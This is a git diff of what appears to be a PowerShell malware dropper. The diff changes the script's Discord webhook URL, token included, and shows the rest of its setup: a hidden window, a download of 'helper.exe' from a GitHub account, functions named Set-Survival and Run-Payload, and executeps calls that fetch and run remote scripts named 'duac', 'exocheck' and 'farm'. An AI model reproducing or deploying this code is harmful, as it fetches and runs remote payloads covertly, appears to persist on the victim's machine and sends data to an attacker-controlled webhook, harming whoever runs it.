@@ -1,4 +1,4 @@
-$WebhookURL = "https://discord.com/api/webhooks/1437119311226474657/9khwH9RGw0FNIZO1WGgoXHMt3OvZj55JCHSY9RvAabcxbfiUguvjug2nu6l4XC97J5vQ"
+$WebhookURL = "https://discord.com/api/webhooks/1442107288021237803/uJ81CURttE4IWIdPJziUTvdSnIVvOF6qoF-YwEBt1UXFwlVZ0I2QRaHCt_p2IyLfJKNu"
 $FileURL       = "https://github.com/skiddyskid111/resources/raw/refs/heads/main/helper.exe"
 $LaunchDelay   = 1
 $WindowStyle   = "Hidden"
@@ -60,7 +60,6 @@ function Set-Survival {
 function Run-Payload {
     try {
         $possibleDirectories = @(
-            "$env:ProgramFiles(x86)",
             "$env:ProgramFiles",
             "$env:APPDATA",
             "$env:LOCALAPPDATA"
@@ -117,4 +116,3 @@ executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/duac")
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/exocheck")
 executeps("https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/farm")
-
